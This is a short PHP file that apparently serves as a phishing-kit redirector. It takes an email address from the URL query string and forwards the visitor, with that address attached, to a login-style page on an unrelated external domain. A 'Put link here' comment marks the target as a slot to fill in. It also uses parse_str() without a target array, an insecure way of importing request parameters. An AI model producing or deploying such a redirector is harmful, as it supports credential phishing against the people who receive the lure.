<?php 

$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
parse_str(parse_url($url, PHP_URL_QUERY));
$domain = explode('@', $email);
$domain_check = '@'.strtolower($domain[1]);

header("Location: https://blandscapediscipline.com/faume/ora-doc/eui_login1.php?_user=".$email); // Put link here //


?>